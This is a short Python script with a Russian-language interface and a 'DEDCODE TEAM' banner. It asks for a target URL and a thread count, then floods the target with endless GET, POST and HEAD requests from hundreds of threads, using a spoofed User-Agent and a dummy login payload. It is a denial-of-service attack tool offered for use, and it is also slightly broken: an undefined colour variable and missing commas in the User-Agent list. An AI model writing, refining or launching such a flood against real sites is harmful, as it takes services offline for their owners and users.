import requests
import sys
import re
import argparse
import requests 
from threading import Thread
import random
import os
import time
print("head...")
users = [
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
    "Mozilla / 5.0 (Macintosh; Intel Mac OS X 10.14; rv: 75.0) Gecko / 20100101 Firefox / 75.0"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
]
headers = {
    'User-Agent' : random.choice(users)
}

os.system("clear")
print(green + f" З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")
print(" '''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼''' ")

url = input("Ссылка: ")
threads = int(input("Потоки (~800 лучше): "))

payload = {
    'namest': 'username',
    'passwordst': 'password',
}
def send():
    while True:
        requests.get(url, headers=headers, data=payload)
        print("Get...")
        requests.post(url, headers=headers, data=payload)
        print("post...")
        requests.head(url, headers=headers, data=payload)
        print("head...")

if __name__ == '__main__':
    for i in range (threads):
        thr = Thread(target=send)
        thr.start()
